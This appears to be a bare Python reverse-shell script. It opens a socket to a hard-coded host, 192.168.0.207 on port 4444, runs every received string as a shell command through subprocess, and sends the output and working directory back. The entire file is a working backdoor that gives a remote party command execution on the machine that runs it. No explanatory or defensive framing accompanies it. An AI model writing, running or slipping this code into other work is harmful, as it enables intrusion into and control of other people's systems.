import socket
import subprocess
import os

ip = "192.168.0.207"
port = 4444

connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect.connect((ip, port))

while True:
	data = connect.recv(1024)
	if data[:2].decode('utf-8') == 'cd':
		os.chdir(data[3:].decode('utf-8'))
	if len(data) > 0:
		cmd = subprocess.Popen(data[:].decode('utf-8'), shell = True, stderr= subprocess.PIPE, stdout = subprocess.PIPE, stdin = subprocess.PIPE)
		bytes = cmd.stdout.read() + cmd.stderr.read()
		info_cliente = str(bytes)
		connect.send(str.encode(info_cliente) + str.encode(os.getcwd() + ">"))

connect.close()